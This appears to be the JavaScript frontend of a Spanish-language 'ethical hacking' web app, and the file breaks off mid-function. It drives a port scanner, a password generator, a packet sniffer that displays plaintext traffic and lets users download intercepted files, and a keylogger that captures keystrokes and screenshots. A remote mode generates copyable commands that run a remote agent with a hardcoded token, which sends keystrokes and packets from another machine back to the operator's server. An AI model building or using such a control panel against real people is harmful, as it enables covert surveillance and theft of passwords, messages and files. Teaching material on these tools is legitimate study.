/**
 * Aplicación de Hacking Ético - JavaScript Frontend
 * Manejo de tabs, formularios, llamadas AJAX y renderizado de resultados.
 */

document.addEventListener('DOMContentLoaded', () => {
    // ---- Tab Navigation ----
    const tabBtns = document.querySelectorAll('.tab-btn');
    const panels = document.querySelectorAll('.panel');

    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const target = btn.dataset.tab;
            tabBtns.forEach(b => b.classList.remove('active'));
            panels.forEach(p => p.classList.remove('active'));
            btn.classList.add('active');
            document.getElementById(target).classList.add('active');
        });
    });

    // ---- Scan Type Radio Buttons ----
    const scanRadios = document.querySelectorAll('input[name="scan_type"]');
    const singleFields = document.getElementById('single-port-fields');
    const rangeFields = document.getElementById('range-port-fields');

    scanRadios.forEach(radio => {
        radio.addEventListener('change', () => {
            singleFields.classList.remove('visible');
            rangeFields.classList.remove('visible');

            if (radio.value === 'single') {
                singleFields.classList.add('visible');
            } else if (radio.value === 'range') {
                rangeFields.classList.add('visible');
            }
        });
    });

    // ---- Port Scanner Form ----
    const scanForm = document.getElementById('scan-form');
    const scanBtn = document.getElementById('scan-btn');
    const scanSpinner = document.getElementById('scan-spinner');
    const scanResults = document.getElementById('scan-results');
    const scanMessage = document.getElementById('scan-message');

    scanForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideElement(scanMessage);
        hideElement(scanResults);

        const host = document.getElementById('scan-host').value.trim();
        const scanType = document.querySelector('input[name="scan_type"]:checked')?.value;

        if (!host) {
            showMessage(scanMessage, 'error', '⚠️ Ingresa una dirección IP o hostname.');
            return;
        }

        if (!scanType) {
            showMessage(scanMessage, 'error', '⚠️ Selecciona un tipo de escaneo.');
            return;
        }

        const payload = { host, scan_type: scanType };

        if (scanType === 'single') {
            const port = document.getElementById('single-port').value;
            if (!port) {
                showMessage(scanMessage, 'error', '⚠️ Ingresa un número de puerto.');
                return;
            }
            payload.port = parseInt(port);
        } else if (scanType === 'range') {
            const startPort = document.getElementById('range-start').value;
            const endPort = document.getElementById('range-end').value;
            if (!startPort || !endPort) {
                showMessage(scanMessage, 'error', '⚠️ Ingresa el rango de puertos.');
                return;
            }
            payload.start_port = parseInt(startPort);
            payload.end_port = parseInt(endPort);
        }

        // Show loading
        scanBtn.disabled = true;
        scanSpinner.classList.add('active');
        scanBtn.querySelector('.btn-text').textContent = 'ESCANEANDO...';

        if (scanType === 'all') {
            showMessage(scanMessage, 'info', '📡 Escaneando todos los puertos (1-65535). Esto puede tomar varios minutos...');
        } else {
            showMessage(scanMessage, 'info', '📡 Escaneando puertos. Por favor espera...');
        }

        try {
            const response = await fetch('/scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await response.json();
            hideElement(scanMessage);

            if (data.success) {
                renderScanResults(data);
            } else {
                showMessage(scanMessage, 'error', `❌ ${data.error}`);
            }
        } catch (error) {
            hideElement(scanMessage);
            showMessage(scanMessage, 'error', `❌ Error de conexión: ${error.message}`);
        } finally {
            scanBtn.disabled = false;
            scanSpinner.classList.remove('active');
            scanBtn.querySelector('.btn-text').textContent = 'INICIAR ESCANEO';
        }
    });

    // ---- Password Generator Form ----
    const passForm = document.getElementById('password-form');
    const passBtn = document.getElementById('pass-btn');
    const passSpinner = document.getElementById('pass-spinner');
    const passResults = document.getElementById('pass-results');
    const passMessage = document.getElementById('pass-message');

    passForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideElement(passMessage);
        hideElement(passResults);

        const length = parseInt(document.getElementById('pass-length').value);
        const count = parseInt(document.getElementById('pass-count').value);

        if (!length || length < 1) {
            showMessage(passMessage, 'error', '⚠️ Ingresa una longitud válida.');
            return;
        }

        if (length < 8) {
            showMessage(passMessage, 'error', '⚠️ La longitud mínima es de 8 caracteres.');
            return;
        }

        if (!count || count < 1) {
            showMessage(passMessage, 'error', '⚠️ Ingresa una cantidad válida (mínimo 1).');
            return;
        }

        if (count > 100) {
            showMessage(passMessage, 'error', '⚠️ La cantidad máxima es 100 contraseñas.');
            return;
        }

        // Show loading
        passBtn.disabled = true;
        passSpinner.classList.add('active');
        passBtn.querySelector('.btn-text').textContent = 'GENERANDO...';

        try {
            const response = await fetch('/generate-passwords', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ length, count })
            });

            const data = await response.json();

            if (data.success) {
                renderPasswordResults(data);
            } else {
                showMessage(passMessage, 'error', `❌ ${data.error}`);
            }
        } catch (error) {
            showMessage(passMessage, 'error', `❌ Error de conexión: ${error.message}`);
        } finally {
            passBtn.disabled = false;
            passSpinner.classList.remove('active');
            passBtn.querySelector('.btn-text').textContent = 'GENERAR CONTRASEÑAS';
        }
    });

    // ---- Render Functions ----

    function renderScanResults(data) {
        const resultsBody = document.getElementById('scan-results-body');
        const resultsInfo = document.getElementById('scan-results-info');

        resultsInfo.textContent = `Host: ${data.host} | Tipo: ${data.scan_type} | Puertos abiertos: ${data.total_open}`;
        resultsBody.innerHTML = '';

        if (data.results.length === 0) {
            resultsBody.innerHTML = `
                <tr>
                    <td colspan="4" class="no-results">
                        <span class="no-results__icon">🔒</span>
                        No se encontraron puertos abiertos
                    </td>
                </tr>
            `;
        } else {
            data.results.forEach(port => {
                const stateClass = port.state === 'open' ? 'port-open' :
                    port.state === 'closed' ? 'port-closed' : 'port-filtered';
                const stateIcon = port.state === 'open' ? '🟢' :
                    port.state === 'closed' ? '🔴' : '🟡';

                resultsBody.innerHTML += `
                    <tr>
                        <td class="port-number">${port.port}</td>
                        <td class="${stateClass}">${stateIcon} ${port.state.toUpperCase()}</td>
                        <td>${port.service}</td>
                        <td>${port.protocol.toUpperCase()}</td>
                    </tr>
                `;
            });
        }

        scanResults.classList.add('visible');
    }

    function renderPasswordResults(data) {
        const container = document.getElementById('pass-results-body');
        const info = document.getElementById('pass-results-info');

        info.textContent = `Longitud: ${data.length} caracteres | Cantidad: ${data.count}`;
        container.innerHTML = '';

        data.passwords.forEach((item, index) => {
            const strengthClass = getStrengthClass(item.strength);

            const div = document.createElement('div');
            div.className = 'password-item';
            div.innerHTML = `
                <span class="password-item__index">${index + 1}</span>
                <span class="password-item__text">${escapeHtml(item.password)}</span>
                <span class="password-item__strength ${strengthClass}">${item.strength}</span>
                <button class="password-item__copy" onclick="copyPassword(this, '${escapeForJs(item.password)}')" title="Copiar">📋</button>
            `;
            container.appendChild(div);
        });

        passResults.classList.add('visible');
    }

    function getStrengthClass(strength) {
        const map = {
            'Muy Fuerte': 'strength-muy-fuerte',
            'Fuerte': 'strength-fuerte',
            'Media': 'strength-media',
            'Débil': 'strength-debil'
        };
        return map[strength] || 'strength-media';
    }

    // ---- Sniffer Form ----
    const sniffForm = document.getElementById('sniffer-form');
    const sniffBtn = document.getElementById('sniff-btn');
    const sniffSpinner = document.getElementById('sniff-spinner');
    const sniffResults = document.getElementById('sniff-results');
    const sniffMessage = document.getElementById('sniff-message');
    let capturedPackets = [];

    sniffForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideElement(sniffMessage);
        hideElement(sniffResults);

        const count = parseInt(document.getElementById('sniff-count').value);
        const filter = document.getElementById('sniff-filter').value;
        const iface = document.getElementById('sniff-interface').value.trim();

        if (!count || count < 1) {
            showMessage(sniffMessage, 'error', '⚠️ Ingresa una cantidad de paquetes válida.');
            return;
        }

        if (count > 200) {
            showMessage(sniffMessage, 'error', '⚠️ La cantidad máxima es 200 paquetes.');
            return;
        }

        // Show loading
        sniffBtn.disabled = true;
        sniffSpinner.classList.add('active');
        sniffBtn.querySelector('.btn-text').textContent = 'CAPTURANDO...';
        showMessage(sniffMessage, 'info', '🕵️ Capturando tráfico de red. Esto puede tomar unos segundos...');

        const payload = { count, filter };
        if (iface) payload.interface = iface;

        try {
            const response = await fetch('/sniff', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await response.json();
            hideElement(sniffMessage);

            if (data.success) {
                capturedPackets = data.packets;
                renderSniffResults(data);
                // ── ARCHIVOS INTERCEPTADOS (captura local) ──────────────
                renderInterceptedFiles(data.intercepted_files || []);
            } else {
                showMessage(sniffMessage, 'error', `❌ ${data.error}`);
            }
        } catch (error) {
            hideElement(sniffMessage);
            showMessage(sniffMessage, 'error', `❌ Error de conexión: ${error.message}`);
        } finally {
            sniffBtn.disabled = false;
            sniffSpinner.classList.remove('active');
            sniffBtn.querySelector('.btn-text').textContent = 'INICIAR CAPTURA';
        }
    });

    // ---- Save Capture Button ----
    const saveCaptureBtn = document.getElementById('save-capture-btn');
    saveCaptureBtn.addEventListener('click', async () => {
        const filepath = document.getElementById('sniff-filepath').value.trim();

        if (!filepath) {
            showMessage(sniffMessage, 'error', '⚠️ Ingresa la ruta donde guardar el archivo.');
            return;
        }

        if (capturedPackets.length === 0) {
            showMessage(sniffMessage, 'error', '⚠️ No hay paquetes capturados para guardar.');
            return;
        }

        saveCaptureBtn.disabled = true;
        saveCaptureBtn.textContent = '⏳ GUARDANDO...';

        try {
            const response = await fetch('/save-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ filepath, packets: capturedPackets })
            });

            const data = await response.json();

            if (data.success) {
                showMessage(sniffMessage, 'success', `✅ Captura guardada en: ${data.filepath} (${data.total_saved} paquetes)`);
            } else {
                showMessage(sniffMessage, 'error', `❌ ${data.error}`);
            }
        } catch (error) {
            showMessage(sniffMessage, 'error', `❌ Error: ${error.message}`);
        } finally {
            saveCaptureBtn.disabled = false;
            saveCaptureBtn.textContent = '💾 GUARDAR CAPTURA';
        }
    });

    function renderSniffResults(data) {
        const resultsBody = document.getElementById('sniff-results-body');
        const resultsInfo = document.getElementById('sniff-results-info');

        resultsInfo.textContent = `Filtro: ${data.filter} | Total capturados: ${data.total_captured}`;
        resultsBody.innerHTML = '';

        // Update security stats dashboard
        if (data.stats) {
            document.getElementById('stat-insecure').textContent = data.stats.insecure;
            document.getElementById('stat-secure').textContent = data.stats.secure;
            document.getElementById('stat-total').textContent = data.stats.total;
            document.getElementById('stat-plaintext').textContent = data.stats.plaintext_detected;
        }

        if (data.packets.length === 0) {
            resultsBody.innerHTML = `
                <tr>
                    <td colspan="8" class="no-results">
                        <span class="no-results__icon">📭</span>
                        No se capturaron paquetes
                    </td>
                </tr>
            `;
        } else {
            data.packets.forEach((pkt, index) => {
                const protocolClass = getProtocolClass(pkt.protocol);
                const src = pkt.src_ip ? `${pkt.src_ip}:${pkt.src_port}` : '-';
                const dst = pkt.dst_ip ? `${pkt.dst_ip}:${pkt.dst_port}` : '-';

                // Security badge
                const secClass = getSecurityClass(pkt.security);
                const secLabel = pkt.security === 'insecure' ? '⚠️ NO SEGURO' :
                    pkt.security === 'secure' ? '🔒 CIFRADO' : '—';

                // Risk badge
                const riskClass = getRiskClass(pkt.risk);

                // Data preview - highlight plain text
                let dataCell = '';
                if (pkt.data_readable && pkt.data) {
                    dataCell = `<span class="data-plaintext" title="${escapeHtml(pkt.data)}">👁️ ${escapeHtml(pkt.data.substring(0, 40))}${pkt.data.length > 40 ? '...' : ''}</span>`;
                } else if (pkt.data && pkt.data.includes('cifrado')) {
                    dataCell = `<span class="data-encrypted">🔒 Cifrado</span>`;
                } else {
                    dataCell = `<span class="data-none">—</span>`;
                }

                resultsBody.innerHTML += `
                    <tr class="row-${pkt.security || 'unknown'}">
                        <td class="port-number">${index + 1}</td>
                        <td><span class="protocol-badge ${protocolClass}">${pkt.protocol}</span></td>
                        <td>${escapeHtml(src)}</td>
                        <td>${escapeHtml(dst)}</td>
                        <td>${escapeHtml(pkt.service || '-')}</td>
                        <td><span class="security-badge ${secClass}">${secLabel}</span></td>
                        <td><span class="risk-badge ${riskClass}">${pkt.risk || '-'}</span></td>
                        <td>${dataCell}</td>
                    </tr>
                `;
            });
        }

        sniffResults.classList.add('visible');
    }

    // ── ARCHIVOS INTERCEPTADOS ────────────────────────────────────────────────
    /**
     * Renderiza la tabla de archivos interceptados vía HTTP en el sniffer.
     * Se llama desde el modo local (respuesta de /sniff) y desde el modo
     * remoto (polling de /agent/results/sniffer).
     *
     * @param {Array} files  - lista de {filename, size, direction, content_type,
     *                          src_ip, dst_ip, timestamp} devuelta por el backend
     */
    function renderInterceptedFiles(files) {
        const section = document.getElementById('intercepted-files-section');
        const tbody = document.getElementById('intercepted-files-body');
        const counter = document.getElementById('intercepted-files-count');

        if (!section || !tbody) return;

        if (!files || files.length === 0) {
            section.style.display = 'none';
            return;
        }

        // Mostrar sección y marcarla para la animación pulse
        section.style.display = 'block';
        // Reiniciar animación quitando y volviendo a añadir la clase
        section.classList.remove('has-files');
        void section.offsetWidth; // forzar reflow
        section.classList.add('has-files');

        if (counter) {
            counter.textContent = `${files.length} archivo${files.length !== 1 ? 's' : ''} detectado${files.length !== 1 ? 's' : ''}`;
        }

        tbody.innerHTML = '';

        files.forEach((f, idx) => {
            const isUpload = f.direction === 'upload';
            const dirBadge = isUpload
                ? '<span class="direction-badge upload">⬆️ Upload</span>'
                : '<span class="direction-badge download">⬇️ Download</span>';

            const sizeText = formatFileSize(f.size);

            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>${idx + 1}</td>
                <td><code>${escapeHtml(f.filename)}</code></td>
                <td><small style="color:#a0a0b0;">${escapeHtml(f.content_type || '—')}</small></td>
                <td>${dirBadge}</td>
                <td>${sizeText}</td>
                <td>
                    <small style="color:#7a7a9a;">
                        ${escapeHtml(f.src_ip || '?')}
                        <span style="color:#e94560;">→</span>
                        ${escapeHtml(f.dst_ip || '?')}
                    </small>
                </td>
                <td><small style="color:#7a7a9a;">${escapeHtml(f.timestamp || '—')}</small></td>
                <td>
                    <a href="/download-intercepted/${idx}"
                       class="btn-intercept-download"
                       download="${escapeHtml(f.filename)}">
                        💾 Descargar
                    </a>
                </td>
            `;
            tbody.appendChild(tr);
        });
    }

    // Exponer para que el modo remoto también pueda llamarla
    window._renderInterceptedFiles = renderInterceptedFiles;

    function formatFileSize(bytes) {
        if (!bytes || bytes === 0) return '—';
        if (bytes < 1024) return `${bytes} B`;
        if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
        return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
    }
    // ─────────────────────────────────────────────────────────────────────────

    function getProtocolClass(protocol) {
        const map = {
            'TCP': 'protocol-tcp',
            'UDP': 'protocol-udp',
            'ICMP': 'protocol-icmp'
        };
        return map[protocol] || 'protocol-other';
    }

    function getSecurityClass(security) {
        const map = {
            'insecure': 'security-insecure',
            'secure': 'security-secure',
            'info': 'security-info'
        };
        return map[security] || 'security-unknown';
    }

    function getRiskClass(risk) {
        const map = {
            'CRÍTICO': 'risk-critical',
            'ALTO': 'risk-high',
            'MEDIO': 'risk-medium',
            'BAJO': 'risk-low',
            'NINGUNO': 'risk-none'
        };
        return map[risk] || 'risk-unknown';
    }

    // ---- Keylogger Form ----
    const keyForm = document.getElementById('keylogger-form');
    const keyBtn = document.getElementById('key-btn');
    const keySpinner = document.getElementById('key-spinner');
    const keyResults = document.getElementById('key-results');
    const keyMessage = document.getElementById('key-message');
    let capturedKeys = [];
    let capturedText = '';
    let capturedScreenshots = [];

    keyForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideElement(keyMessage);
        hideElement(keyResults);

        const duration = parseInt(document.getElementById('key-duration').value);

        if (!duration || duration < 1 || duration > 30) {
            showMessage(keyMessage, 'error', '⚠️ La duración debe ser entre 1 y 30 segundos.');
            return;
        }

        // Show loading
        keyBtn.disabled = true;
        keySpinner.classList.add('active');
        keyBtn.querySelector('.btn-text').textContent = `CAPTURANDO... (${duration}s)`;
        showMessage(keyMessage, 'info', `⌨️ Keylogger activo durante ${duration} segundos. ¡Escribe algo en cualquier ventana!`);

        try {
            const response = await fetch('/keylogger-start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ duration })
            });

            const data = await response.json();
            hideElement(keyMessage);

            if (data.success) {
                capturedKeys = data.keys;
                capturedText = data.captured_text;
                capturedScreenshots = data.screenshots || [];
                // Exponer para el guardado unificado
                window._localCapturedKeys = capturedKeys;
                window._localCapturedText = capturedText;
                window._localCapturedScreenshots = capturedScreenshots;
                renderKeyloggerResults(data);
            } else {
                showMessage(keyMessage, 'error', `❌ ${data.error}`);
            }
        } catch (error) {
            hideElement(keyMessage);
            showMessage(keyMessage, 'error', `❌ Error: ${error.message}`);
        } finally {
            keyBtn.disabled = false;
            keySpinner.classList.remove('active');
            keyBtn.querySelector('.btn-text').textContent = 'INICIAR KEYLOGGER';
        }
    });

    // ---- Save Keylog Button ----
    const saveKeylogBtn = document.getElementById('save-keylog-btn');
    saveKeylogBtn.addEventListener('click', async () => {
        const filepath = document.getElementById('key-filepath').value.trim();

        if (!filepath) {
            showMessage(keyMessage, 'error', '⚠️ Ingresa la ruta donde guardar el archivo.');
            return;
        }

        if (capturedKeys.length === 0) {
            showMessage(keyMessage, 'error', '⚠️ No hay teclas capturadas para guardar.');
            return;
        }

        saveKeylogBtn.disabled = true;
        saveKeylogBtn.textContent = '⏳ GUARDANDO...';

        try {
            const response = await fetch('/save-keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    filepath,
                    keys: capturedKeys,
                    captured_text: capturedText,
                    screenshots: capturedScreenshots
                })
            });

            const data = await response.json();

            if (data.success) {
                const scr = data.screenshots_saved ? ` | ${data.screenshots_saved} capturas guardadas` : '';
                showMessage(keyMessage, 'success', `✅ Registro guardado en: ${data.filepath} (${data.total_saved} teclas${scr})`);
            } else {
                showMessage(keyMessage, 'error', `❌ ${data.error}`);
            }
        } catch (error) {
            showMessage(keyMessage, 'error', `❌ Error: ${error.message}`);
        } finally {
            saveKeylogBtn.disabled = false;
            saveKeylogBtn.textContent = '💾 GUARDAR REGISTRO';
        }
    });

    function renderKeyloggerResults(data) {
        const resultsBody = document.getElementById('key-results-body');
        const resultsInfo = document.getElementById('key-results-info');
        const capturedTextBox = document.getElementById('key-captured-text');

        // Update stats
        if (data.stats) {
            document.getElementById('key-stat-total').textContent = data.stats.total;
            document.getElementById('key-stat-letters').textContent = data.stats.letters;
            document.getElementById('key-stat-numbers').textContent = data.stats.numbers;
            document.getElementById('key-stat-special').textContent = data.stats.special;
        }

        // Screenshots stat
        const totalScr = (data.screenshots || []).length;
        const scrStatEl = document.getElementById('key-stat-screenshots');
        if (scrStatEl) scrStatEl.textContent = totalScr;

        // Show captured text
        if (data.captured_text) {
            capturedTextBox.textContent = data.captured_text;
        } else {
            capturedTextBox.innerHTML = '<em>No se capturó texto legible</em>';
        }

        resultsInfo.textContent = `Duración: ${data.duration}s | Total: ${data.total_keys} teclas`;
        resultsBody.innerHTML = '';

        if (data.keys.length === 0) {
            resultsBody.innerHTML = `
                <tr>
                    <td colspan="5" class="no-results">
                        <span class="no-results__icon">⌨️</span>
                        No se capturaron teclas
                    </td>
                </tr>
            `;
        } else {
            data.keys.forEach((key, index) => {
                const time = key.timestamp ? key.timestamp.split(' ')[1] : '-';
                const typeClass = getKeyTypeClass(key.type);

                resultsBody.innerHTML += `
                    <tr>
                        <td class="port-number">${index + 1}</td>
                        <td>${time}</td>
                        <td><span class="key-name">${escapeHtml(key.key)}</span></td>
                        <td>${key.key_code}</td>
                        <td><span class="key-type-badge ${typeClass}">${key.type}</span></td>
                    </tr>
                `;
            });
        }

        keyResults.classList.add('visible');

        // Render screenshots
        renderScreenshots(data.screenshots || []);
    }

    function getKeyTypeClass(type) {
        const map = {
            'letra': 'key-type-letra',
            'número': 'key-type-numero',
            'símbolo': 'key-type-simbolo',
            'modificador': 'key-type-modificador',
            'espacio': 'key-type-especial',
            'enter': 'key-type-especial',
            'tabulación': 'key-type-especial',
            'borrar': 'key-type-modificador',
            'navegación': 'key-type-especial',
            'función': 'key-type-especial'
        };
        return map[type] || 'key-type-especial';
    }

    // ---- Screenshot Gallery ----
    function renderScreenshots(screenshots) {
        const section = document.getElementById('key-screenshots-section');
        const gallery = document.getElementById('key-screenshots-gallery');
        const info = document.getElementById('key-screenshots-info');
        if (!gallery || !section) return;

        if (!screenshots || screenshots.length === 0) {
            section.style.display = 'none';
            return;
        }

        info.textContent = `${screenshots.length} captura(s) de pantalla`;
        gallery.innerHTML = '';

        screenshots.forEach(scr => {
            const card = document.createElement('div');
            card.className = 'screenshot-card';
            card.innerHTML = `
                <img src="data:image/jpeg;base64,${scr.data}" alt="Captura ${scr.index}" loading="lazy">
                <div class="screenshot-card__info">
                    <span class="screenshot-card__index">📸 #${scr.index}</span>
                    <span>${scr.timestamp || ''}</span>
                </div>
            `;
            card.querySelector('img').addEventListener('click', () => openLightbox(scr.data));
            gallery.appendChild(card);
        });

        section.style.display = 'block';
    }

    // ---- Lightbox ----
    let lightbox = document.getElementById('screenshot-lightbox');
    if (!lightbox) {
        lightbox = document.createElement('div');
        lightbox.id = 'screenshot-lightbox';
        lightbox.className = 'screenshot-lightbox';
        lightbox.innerHTML = `
            <span class="screenshot-lightbox__close">✕</span>
            <img id="lightbox-img" src="" alt="Captura ampliada">
        `;
        document.body.appendChild(lightbox);
        lightbox.addEventListener('click', () => lightbox.classList.remove('open'));
    }

    function openLightbox(b64) {
        document.getElementById('lightbox-img').src = `data:image/jpeg;base64,${b64}`;
        lightbox.classList.add('open');
    }

    // ---- Utility Functions ----

    function showMessage(el, type, text) {
        const typeClass = type === 'error' ? 'error' : type === 'info' ? 'info' : type === 'success' ? 'success' : 'warning';
        el.className = `message message--${typeClass} visible`;
        el.innerHTML = text;
    }

    function hideElement(el) {
        el.classList.remove('visible');
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function escapeForJs(text) {
        return text.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
    }
});

// Global function for copy button
function copyPassword(btn, password) {
    navigator.clipboard.writeText(password).then(() => {
        btn.classList.add('copied');
        btn.textContent = '✅';
        setTimeout(() => {
            btn.classList.remove('copied');
            btn.textContent = '📋';
        }, 2000);
    }).catch(() => {
        // Fallback for older browsers
        const textarea = document.createElement('textarea');
        textarea.value = password;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        btn.classList.add('copied');
        btn.textContent = '✅';
        setTimeout(() => {
            btn.classList.remove('copied');
            btn.textContent = '📋';
        }, 2000);
    });
}

// ──────────────────────────────────────────────────────────
// REMOTE MODE — Sniffer & Keylogger
// ──────────────────────────────────────────────────────────

(function initRemoteMode() {
    const POLL_INTERVAL_MS = 2000;
    const AGENT_TOKEN = 'CIBER2026';

    // ---- Helpers ----
    function toggleRemote(bodyId, chevronId) {
        const body = document.getElementById(bodyId);
        const chevron = document.getElementById(chevronId);
        if (!body || !chevron) return;
        body.classList.toggle('open');
        chevron.classList.toggle('open');
    }

    function copyText(text, btn) {
        navigator.clipboard.writeText(text).then(() => {
            btn.textContent = '✅';
            setTimeout(() => { btn.textContent = '📋'; }, 2000);
        }).catch(() => {
            const ta = document.createElement('textarea');
            ta.value = text;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            btn.textContent = '✅';
            setTimeout(() => { btn.textContent = '📋'; }, 2000);
        });
    }

    // ---- Sniffer Remote Toggle ----
    const sniffToggle = document.getElementById('sniff-remote-toggle');
    if (sniffToggle) {
        sniffToggle.addEventListener('click', () => toggleRemote('sniff-remote-body', 'sniff-chevron'));
    }

    // ---- Keylogger Remote Toggle ----
    const keyToggle = document.getElementById('key-remote-toggle');
    if (keyToggle) {
        keyToggle.addEventListener('click', () => toggleRemote('key-remote-body', 'key-chevron'));
    }

    // ================================================================
    //  SNIFFER REMOTE COMMAND GENERATOR + POLLING
    // ================================================================
    const sniffIpInput = document.getElementById('sniff-remote-server-ip');
    const sniffRemoteCount = document.getElementById('sniff-remote-count');
    const sniffRemoteFilter = document.getElementById('sniff-remote-filter');
    const sniffCmdText = document.getElementById('sniff-command-text');
    const sniffCopyCmd = document.getElementById('sniff-copy-cmd');
    const sniffRemoteBtn = document.getElementById('sniff-remote-btn');
    const sniffRemoteSpinner = document.getElementById('sniff-remote-spinner');

    function buildSniffCommand() {
        const ip = sniffIpInput ? sniffIpInput.value.trim() : '';
        const count = sniffRemoteCount ? sniffRemoteCount.value : 50;
        const filter = sniffRemoteFilter ? sniffRemoteFilter.value : 'all';
        if (!ip) return null;
        return `sudo python3 remote_agent.py --server http://${ip}:5000 --mode sniffer --count ${count} --filter ${filter} --token ${AGENT_TOKEN}`;
    }

    function updateSniffCommand() {
        if (!sniffCmdText) return;
        const cmd = buildSniffCommand();
        sniffCmdText.textContent = cmd || '— ingresa la IP del servidor para generar el comando —';
    }

    if (sniffIpInput) sniffIpInput.addEventListener('input', updateSniffCommand);
    if (sniffRemoteCount) sniffRemoteCount.addEventListener('input', updateSniffCommand);
    if (sniffRemoteFilter) sniffRemoteFilter.addEventListener('change', updateSniffCommand);

    if (sniffCopyCmd) {
        sniffCopyCmd.addEventListener('click', () => {
            const cmd = buildSniffCommand();
            if (cmd) copyText(cmd, sniffCopyCmd);
        });
    }

    // Polling for sniffer remote results
    let sniffPollTimer = null;

    if (sniffRemoteBtn) {
        sniffRemoteBtn.addEventListener('click', async () => {
            if (sniffPollTimer) { clearInterval(sniffPollTimer); sniffPollTimer = null; }

            const sniffMessage = document.getElementById('sniff-message');
            const sniffResults = document.getElementById('sniff-results');

            sniffRemoteBtn.disabled = true;
            sniffRemoteSpinner.classList.add('active');
            sniffRemoteBtn.querySelector('.btn-text').textContent = '📡 ESPERANDO AGENTE...';

            showAgentBadge(sniffMessage, 'waiting', '⏳ Esperando conexión del agente remoto...');

            let lastCount = 0;
            let lastFileCount = 0;

            sniffPollTimer = setInterval(async () => {
                try {
                    const resp = await fetch('/agent/results/sniffer');
                    const data = await resp.json();

                    if (!data.success) return;

                    const agent = data.agent || {};
                    const total = data.total || 0;

                    if (agent.agent_ip) {
                        showAgentBadge(sniffMessage, 'connected',
                            `🟢 Agente conectado: ${agent.agent_ip} | ${total} paquetes recibidos`);
                    }

                    if (total > lastCount && total > 0) {
                        lastCount = total;
                        const fakeData = {
                            packets: data.packets,
                            total_captured: total,
                            filter: data.filter || 'all',
                            stats: data.stats
                        };
                        window._remoteSniffRender(fakeData, sniffResults);
                    }

                    // ── ARCHIVOS INTERCEPTADOS (modo remoto) ────────────
                    const files = data.intercepted_files || [];
                    if (files.length > lastFileCount && window._renderInterceptedFiles) {
                        lastFileCount = files.length;
                        window._renderInterceptedFiles(files);
                    }

                    if (data.complete) {
                        clearInterval(sniffPollTimer);
                        sniffPollTimer = null;
                        showAgentBadge(sniffMessage, 'complete',
                            `✅ Captura remota finalizada: ${total} paquetes de ${agent.agent_ip}`);
                        sniffRemoteBtn.disabled = false;
                        sniffRemoteSpinner.classList.remove('active');
                        sniffRemoteBtn.querySelector('.btn-text').textContent = '⏳ ESPERAR AGENTE REMOTO';
                    }
                } catch (_) { /* red no disponible, seguir esperando */ }
            }, POLL_INTERVAL_MS);
        });
    }

    // ================================================================
    //  KEYLOGGER REMOTE COMMAND GENERATOR + POLLING
    // ================================================================
    const keyIpInput = document.getElementById('key-remote-server-ip');
    const keyRemoteDuration = document.getElementById('key-remote-duration');
    const keyCmdText = document.getElementById('key-command-text');
    const keyCopyCmd = document.getElementById('key-copy-cmd');
    const keyRemoteBtn = document.getElementById('key-remote-btn');
    const keyRemoteSpinner = document.getElementById('key-remote-spinner');

    function buildKeyCommand() {
        const ip = keyIpInput ? keyIpInput.value.trim() : '';
        const dur = keyRemoteDuration ? keyRemoteDuration.value : 20;
        if (!ip) return null;
        return `python3 remote_agent.py --server http://${ip}:5000 --mode keylogger --duration ${dur} --token ${AGENT_TOKEN}`;
    }

    function updateKeyCommand() {
        if (!keyCmdText) return;
        const cmd = buildKeyCommand();
        keyCmdText.textContent = cmd || '— ingresa la IP del servidor para generar el comando —';
    }

    if (keyIpInput) keyIpInput.addEventListener('input', updateKeyCommand);
    if (keyRemoteDuration) keyRemoteDuration.addEventListener('input', updateKeyCommand);

    if (keyCopyCmd) {
        keyCopyCmd.addEventListener('click', () => {
            const cmd = buildKeyCommand();
            if (cmd) copyText(cmd, keyCopyCmd);
        });
    }

    // Polling for keylogger remote results
    let keyPollTimer = null;

    if (keyRemoteBtn) {
        keyRemoteBtn.addEventListener('click', async () => {
            if (keyPollTimer) { clearInterval(keyPollTimer); keyPollTimer = null; }

            const keyMessage = document.getElementById('key-message');
            const keyResults = document.getElementById('key-results');

            keyRemoteBtn.disabled = true;
            keyRemoteSpinner.classList.add('active');
            keyRemoteBtn.querySelector('.btn-text').textContent = '⌨️ ESPERANDO AGENTE...';

            showAgentBadge(keyMessage, 'waiting', '⏳ Esperando conexión del agente remoto...');

            let lastCount = 0;

            keyPollTimer = setInterval(async () => {
                try {
                    const resp = await fetch('/agent/results/keylogger');
                    const data = await resp.json();

                    if (!data.success) return;

                    const agent = data.agent || {};
                    const total = data.total_keys || 0;

                    if (agent.agent_ip) {
                        showAgentBadge(keyMessage, 'connected',
                            `🟢 Agente conectado: ${agent.agent_ip} | ${total} teclas recibidas`);
                    }

                    if (total > lastCount && total > 0) {
                        lastCount = total;
                        window._remoteCapturedKeys = data.keys;
                        window._remoteCapturedScreenshots = data.screenshots || [];
                        window._remoteKeyRender(data, keyResults);
                    }

                    if (data.complete) {
                        clearInterval(keyPollTimer);
                        keyPollTimer = null;
                        window._remoteCapturedKeys = data.keys;
                        window._remoteCapturedScreenshots = data.screenshots || [];
                        showAgentBadge(keyMessage, 'complete',
                            `✅ Keylogger remoto finalizado: ${total} teclas de ${agent.agent_ip}`);
